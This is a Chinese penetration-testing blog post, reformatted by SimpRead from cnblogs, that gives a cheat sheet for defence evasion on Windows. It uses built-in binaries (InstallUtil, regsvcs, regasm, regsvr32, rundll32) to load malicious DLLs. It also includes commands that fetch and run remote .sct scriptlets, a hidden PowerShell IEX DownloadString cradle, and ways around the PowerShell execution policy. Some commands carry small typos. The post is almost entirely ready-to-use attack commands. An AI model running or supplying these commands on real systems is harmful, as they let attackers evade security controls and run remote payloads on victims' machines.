\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[www.cnblogs.com\](https://www.cnblogs.com/-mo-/p/12670053.html)

在渗透测试过程中，意图使目标主机执行恶意 DLL ，达到一定的目的。但在这个过程中总是会遇到各种各种的安全防护，下面通过系统自带的程序来绕过安全防护，加载我们自己想要执行的 DLL 文件：

```
#InstallUtil.exe
#x86
C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
#x64
C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.3031964\\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll

#regsvcs.exe
#x86
C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe AllTheThings.dll
#x64
C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regsvcs.exe AllTheThings.dll

#regasm.exe
#x86
C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U AllTheThings.dll
#x64
C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe /U AllTheThings.dll

#regsvr32
#x86
regsvr32 /s /u AllTheThings.dll
#x64
regsvr32 /s AllTheThings.dll

#加载远程脚本执行
regsvr32 /s /u /i:http://ip.xyz/file.sct scrobj.dll
regsvr32 /u /n /s /i:\\\\192.168.164.1\\folder\\payload.sct scrobj.dll

#rundll32
rundll32 AllTheThings.dll,EntryPoint
rundll32 javascript:"\\..\\mshtml,RunHTMLApplication";o=GetObject("script:http://ip/payload.sct");window.close();
rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');"
rundll32.exe javascript:"\\..\\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\\"WScript.Shell\\");w.run(\\"calc\\");window.close()");
rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}


```

顺便再补充一下绕过 PowerShell 执行策略的命令：

```
#本地文件执行
powershell.exe -ExecutionPolicy bypass -File Payload.ps1
powershell.exe exec bypass -Command "& {Import-Module C:\\Payload.ps1;Invoke-AllChecks}"

#远程无文件执行
powershell.exe -ExecutionPolicy Bypass-WindowStyle Hidden-NoProfile-NonIIEX(New-ObjectNet.WebClient).DownloadString("http://192.168.1.1/Payload.ps1");\[payload的参数\]  (去除方括号)

#如果本地的 powershell 命令参数进行了限制，还可以尝试使用 ps\_encoder.py 脚本将编码转为 base64 格式


```

```
forfiles /p %COMSPEC:~0,19% /s /c "@file -noe" /m po\*l.\*e


```

![](https://img2020.cnblogs.com/blog/1561366/202004/1561366-20200409221842716-1026625457.png)